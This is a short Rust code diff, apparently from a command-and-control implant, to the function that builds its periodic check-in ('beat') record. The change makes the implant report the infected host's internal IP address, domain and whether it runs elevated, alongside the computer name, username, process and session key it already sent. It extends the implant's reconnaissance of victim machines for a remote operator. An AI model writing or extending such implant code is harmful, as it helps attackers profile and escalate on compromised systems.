@@ -328,9 +328,8 @@ fn split_host_port(s: &[u8]) -> (&[u8], u16) {
 }
 
 /// The beat of the current cycle, from the runtime profile and the
-/// collected identity. MVP limitations (documented in PARITE.md): no
-/// internal IP (0.0.0.0), no domain, no elevation/server detection — the
-/// session appears with those fields blank.
+/// collected identity. Server detection (flag bit 3) remains à faire
+/// (documented in PARITE.md).
 fn cycle_beat<'a>(instance: &'a Instance) -> BeatData<'a> {
     BeatData {
         sleep_sec: instance.sleep_ms / 1000,
@@ -345,10 +344,11 @@ fn cycle_beat<'a>(instance: &'a Instance) -> BeatData<'a> {
         build_number: instance.sysinfo.build,
         major: instance.sysinfo.major,
         minor: instance.sysinfo.minor,
-        internal_ip: 0,
-        flags: 0b0011, // x64 agent, x64 OS
+        internal_ip: instance.sysinfo.internal_ip,
+        // bit0 x64 agent, bit1 x64 OS, bit2 elevated
+        flags: 0b0011 | u8::from(instance.sysinfo.elevated) << 2,
         session_key: &instance.session_key,
-        domain: b"",
+        domain: instance.sysinfo.domain(),
         computer: instance.sysinfo.computer(),
         username: instance.sysinfo.username(),
         process: instance.sysinfo.process_name(),
